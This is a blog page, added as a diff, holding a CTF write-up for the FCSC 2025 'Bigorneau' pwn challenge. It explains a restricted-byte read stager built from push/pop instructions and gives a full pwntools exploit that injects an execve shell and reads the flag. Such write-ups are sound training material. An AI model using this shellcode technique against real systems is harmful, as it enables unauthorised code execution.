@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>0xb0tm4n&#x27;s website</title>
+  <script src="https://cdn.jsdelivr.net/npm/js-cookie@3.0.5/dist/js.cookie.min.js"
+    integrity="sha256-WCzAhd2P6gRJF9Hv3oOOd+hFJi/QJbv+Azn4CGB8gfY=" crossorigin="anonymous" defer></script>
+  <script src="/js/index.js" defer></script>
+  <script src="/js/prompt.js" defer></script>
+  <script src="/js/keyboard.js" defer></script>
+  <script src="/js/tab.js" defer></script>
+  <script src="/js/commands.js" defer></script>
+  <script src="/js/config.js" defer></script><link rel="stylesheet" href="/css/base.css"><link rel="stylesheet" href="/css/page.css"></head><body onkeydown='exec(event)' style='background-image: url("/assets/background.jpg");'><main>
+      <div class="files" id="files" tabindex="0">
+<ul>
+  <li class="file">
+    <span><a href='https://super-botman.github.io/readme/'
+      tabindex="0">  README</a></span>
+  </li>
+
+<li class="folder"><span>
+      <a href='https://super-botman.github.io/pwn/'
+        tabindex="0">  Pwn
+      </a>
+    </span>
+
+    <ul>
+      
+      
+        
+        
+          
+<li>
+<span>└──
+  <a href='https://super-botman.github.io/pwn/writeups/'
+    tabindex="0">  Writeups
+  </a>
+</span>
+
+
+  <ul>
+
+  
+  <li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/robot/'
+        tabindex="0">  FCSC 2023 | Robot</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a class="selected"href='https://super-botman.github.io/pwn/writeups/bigorneau/'
+        tabindex="0">  FCSC 2025 | Bigorneau</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/http3/'
+        tabindex="0">  FCSC 2025 | HTTP3</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/small-prime-shellcode/'
+        tabindex="0">  FCSC 2025 | Small Prime Shellcode</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/aarchibald/'
+        tabindex="0">  Hackropole | Aarchibald</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/alfred/'
+        tabindex="0">  Hackropole | Alfred</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/armigo/'
+        tabindex="0">  Hackropole | Armigo</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/pwn103/'
+        tabindex="0">  THM | pwn101 task 103</a>
+    </span>
+  </li></ul>
+</li>
+
+        
+    </ul>
+  </li><li class="folder"><span>
+      <a href='https://super-botman.github.io/web/'
+        tabindex="0">  Web
+      </a>
+    </span>
+
+    <ul>
+      
+      
+        
+        
+          
+<li>
+<span>└──
+  <a href='https://super-botman.github.io/web/writeups/'
+    tabindex="0">  Writeups
+  </a>
+</span>
+
+
+  <ul>
+
+  
+  <li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/web/writeups/boiler/'
+        tabindex="0">  THM | Boiler</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/web/writeups/thomghost/'
+        tabindex="0">  THM | Thomghost</a>
+    </span>
+  </li></ul>
+</li>
+
+        
+    </ul>
+  </li>
+</ul>
+</div>
+      <div class="viewer page" id="viewer" tabindex="0">
+        <div class="tab">
+<div class="file-manager" onclick='document.getElementById("files").classList.toggle("open"); document.getElementById("content").classList.toggle("close")'> </div>
+<ul id="tabs">
+</ul>
+
+
+</div>
+        <div class="content" id="content"><h1 id="pwn-bigorneau-fcsc-2025">[Pwn] Bigorneau |  FCSC 2025</h1>
+<ul>
+<li><a href="https://super-botman.github.io/pwn/writeups/bigorneau/#checksecs">1. Checksec</a></li>
+<li><a href="https://super-botman.github.io/pwn/writeups/bigorneau/#writeup">2. Writeup</a></li>
+<li><a href="https://super-botman.github.io/pwn/writeups/bigorneau/#full-exploit">3. Full exploit</a></li>
+</ul>
+<h2 id="checksecs">Checksecs</h2>
+<pre style="background-color:#1a1b26;color:#c0caf5;"><code><span>[*] &#39;/home/botman/Documents/challenges/FCSC/bigorneau/bigorneau&#39;
+</span><span>    Arch:       amd64-64-little
+</span><span>    RELRO:      Full RELRO
+</span><span>    Stack:      Canary found
+</span><span>    NX:         NX unknown - GNU_STACK missing
+</span><span>    PIE:        PIE enabled
+</span><span>    Stack:      Executable
+</span><span>    RWX:        Has RWX segments
+</span><span>    SHSTK:      Enabled
+</span><span>    IBT:        Enabled
+</span><span>    Stripped:   No
+</span></code></pre>
+<h2 id="tl-dr">TL;DR</h2>
+<p>Constraints: 6 different bytes</p>
+<p>Solution:</p>
+<ul>
+<li>Simple read shellcode into the stack</li>
+<li>Use only push/pop instructions to fill <code>rsi</code>/<code>rdx</code></li>
+<li>Fill <code>rdx</code> using bytes already present in the shellcode</li>
+</ul>
+<h2 id="writeup">Writeup</h2>
+<p>This challenge was fairly easy. The only constraint for our shellcode was to use <strong>only 6 different bytes</strong>. Instead of using a classical <code>execve</code> shellcode, I developed a simple shellcode with a <code>read</code> syscall that allowed me to write onto the stack and then execute the real <code>execve</code> shellcode.</p>
+<p>I started with a "normal" shellcode, which looked like this:</p>
+<pre data-lang="asm" style="background-color:#1a1b26;color:#c0caf5;" class="language-asm "><code class="language-asm" data-lang="asm"><span style="color:#bb9af7;">push </span><span style="color:#e0af68;">rsp
+</span><span style="color:#bb9af7;">mov </span><span style="color:#e0af68;">rsi</span><span>, </span><span style="color:#e0af68;">rsp
+</span><span style="color:#bb9af7;">mov </span><span style="color:#e0af68;">rdx</span><span>, </span><span style="color:#7aa2f7;">shellcode_len
+</span><span style="color:#bb9af7;">syscall
+</span></code></pre>
+<blockquote>
+<p><span style="color: #82aaff;"><strong> NOTES</strong></span></p>
+<p>As you can see, I only set <code>rsi</code> and <code>rdx</code>, as <code>rax</code> was already <code>0x0</code> (<a href="https://x64.syscall.sh/">read syscall</a>) thanks to the preface added by <code>bigorneau.py</code>.</p>
+</blockquote>
+<p>Since the objective was to use as few different bytes as possible, I removed all the <code>mov</code> instructions (which have large opcodes) and replaced them with <code>push</code>/<code>pop</code> instructions:</p>
+<pre data-lang="asm" style="background-color:#1a1b26;color:#c0caf5;" class="language-asm "><code class="language-asm" data-lang="asm"><span style="color:#bb9af7;">push </span><span style="color:#e0af68;">rsp
+</span><span style="color:#bb9af7;">push </span><span style="color:#e0af68;">rsp
+</span><span style="color:#bb9af7;">pop </span><span style="color:#e0af68;">rsi
+</span><span style="color:#bb9af7;">push </span><span style="color:#7aa2f7;">shellcode_len
+</span><span style="color:#bb9af7;">pop </span><span style="color:#e0af68;">rdx
+</span><span style="color:#bb9af7;">syscall
+</span></code></pre>
+<div style="page-break-after: always;"></div>
+<p>At this point, it was almost done. The only problem was the <code>shellcode_len</code> value. I replaced it with values already present in the shellcode to avoid introducing new bytes, obtaining:</p>
+<pre data-lang="asm" style="background-color:#1a1b26;color:#c0caf5;" class="language-asm "><code class="language-asm" data-lang="asm"><span style="color:#bb9af7;">push </span><span style="color:#e0af68;">rsp
+</span><span style="color:#bb9af7;">push </span><span style="color:#e0af68;">rsp
+</span><span style="color:#bb9af7;">pop </span><span style="color:#e0af68;">rsi
+</span><span style="color:#bb9af7;">push 0x0f050f05
+</span><span style="color:#bb9af7;">pop </span><span style="color:#e0af68;">rdx
+</span><span style="color:#bb9af7;">syscall
+</span></code></pre>
+<blockquote>
+<p><span style="color: #82aaff;"><strong> NOTES</strong></span></p>
+<p>If I had pushed <code>0x100</code> onto the stack, the shellcode would have looked like <code>0x54545e68000100005a0f05</code>, introducing two extra bytes <code>0x0</code> and <code>0x1</code>. By reusing the existing <code>0xf</code> and <code>0x5</code> bytes, I wrote <code>push 0x0f050f05</code>, resulting in the shellcode <code>0x54545e68050f050f5a0f05</code>.</p>
+</blockquote>
+<p>Finally, I wrote a small script to send the first-stage shellcode followed by the real <code>execve</code> shellcode with a little padding to reach <code>rip</code> and boom, pwned:</p>
+<h2 id="full-exploit">Full exploit</h2>
+<pre data-lang="python" style="background-color:#1a1b26;color:#c0caf5;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#7dcfff;">from </span><span>pwn </span><span style="color:#7dcfff;">import </span><span style="color:#ff9e64;">*
+</span><span>
+</span><span style="color:#ff9e64;">CHALL </span><span style="color:#89ddff;">= &quot;</span><span style="color:#9ece6a;">bigorneau.py</span><span style="color:#89ddff;">&quot;
+</span><span>
+</span><span style="color:#bb9af7;">def </span><span style="color:#7aa2f7;">exploit</span><span style="color:#9abdf5;">(</span><span style="color:#e0af68;">io</span><span style="color:#89ddff;">, </span><span style="color:#e0af68;">elf</span><span style="color:#9abdf5;">):
+</span><span>    </span><span style="color:#7aa2f7;">context</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">update</span><span style="color:#9abdf5;">(</span><span style="color:#e0af68;">arch</span><span style="color:#89ddff;">=&#39;</span><span style="color:#9ece6a;">x86_64</span><span style="color:#89ddff;">&#39;</span><span style="color:#9abdf5;">)
+</span><span>    shellcode </span><span style="color:#89ddff;">= &#39;&#39;&#39;
+</span><span style="color:#9ece6a;">    push rsp
+</span><span style="color:#9ece6a;">    push rsp
+</span><span style="color:#9ece6a;">    pop rsi
+</span><span style="color:#9ece6a;">    push 0x0f050f05
+</span><span style="color:#9ece6a;">    pop rdx
+</span><span style="color:#9ece6a;">    syscall
+</span><span style="color:#9ece6a;">    </span><span style="color:#89ddff;">&#39;&#39;&#39;
+</span><span>    shellcode </span><span style="color:#89ddff;">= </span><span style="color:#0db9d7;">bytes</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">asm</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">shellcode</span><span style="color:#9abdf5;">))
+</span><span>
+</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">info</span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">shellcode: </span><span style="color:#89ddff;">&#39; + </span><span style="color:#2ac3de;">hex</span><span style="color:#9abdf5;">(</span><span style="color:#0db9d7;">int</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">from_bytes</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">shellcode</span><span style="color:#9abdf5;">)))
+</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">info</span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">set: </span><span>%s</span><span style="color:#9ece6a;"> : </span><span>%i</span><span style="color:#89ddff;">&#39; % </span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">, </span><span style="color:#89ddff;">&#39;.</span><span style="color:#7aa2f7;">join</span><span style="color:#9abdf5;">([</span><span style="color:#2ac3de;">hex</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">i</span><span style="color:#9abdf5;">) </span><span style="color:#bb9af7;">for </span><span style="color:#7aa2f7;">i </span><span style="color:#bb9af7;">in </span><span style="color:#0db9d7;">set</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">shellcode</span><span style="color:#9abdf5;">)])</span><span style="color:#89ddff;">, </span><span style="color:#2ac3de;">len</span><span style="color:#9abdf5;">(</span><span style="color:#0db9d7;">set</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">shellcode</span><span style="color:#9abdf5;">))))
+</span><span>
+</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">sendlineafter</span><span style="color:#9abdf5;">(</span><span style="color:#bb9af7;">b</span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">:</span><span style="color:#89ddff;">\n&#39;, </span><span style="color:#2ac3de;">hex</span><span style="color:#9abdf5;">(</span><span style="color:#0db9d7;">int</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">from_bytes</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">shellcode</span><span style="color:#9abdf5;">))[</span><span style="color:#ff9e64;">2</span><span style="color:#89ddff;">:</span><span style="color:#9abdf5;">]</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">encode</span><span style="color:#9abdf5;">())
+</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">sendline</span><span style="color:#9abdf5;">(</span><span style="color:#bb9af7;">b</span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">A</span><span style="color:#89ddff;">&#39;*</span><span style="color:#ff9e64;">104 </span><span style="color:#89ddff;">+ </span><span style="color:#0db9d7;">bytes</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">asm</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">shellcraft</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">sh</span><span style="color:#9abdf5;">())))
+</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">sendline</span><span style="color:#9abdf5;">(</span><span style="color:#bb9af7;">b</span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">cat flag.txt</span><span style="color:#89ddff;">&#39;</span><span style="color:#9abdf5;">)
+</span><span>    flag </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">recvline</span><span style="color:#9abdf5;">()</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">decode</span><span style="color:#9abdf5;">()
+</span><span>    </span><span style="font-style:italic;color:#bb9af7;">return </span><span>flag
+</span></code></pre>
+<p><a href="/exploits/bigorneau.py">download here</a></p>
+<p><strong>Written by <em>0xB0tm4n</em></strong></p>
+
+        </div>
+      </div>
+      <div class="prompt" id="terminal"><input
+    type="text"
+    id="setter"
+    onkeydown="writeit(this, event);moveIt(this.value.length, event)"
+    onchange="writeit(this, event)"
+    onkeyup="writeit(this, event)"
+    onkeypress="writeit(this, event);"
+    >
+<label for="setter" id="writer"> </label><b class="cursor" id="cursor"></b></div>
+    </main>
+  </body>
+
+</html>
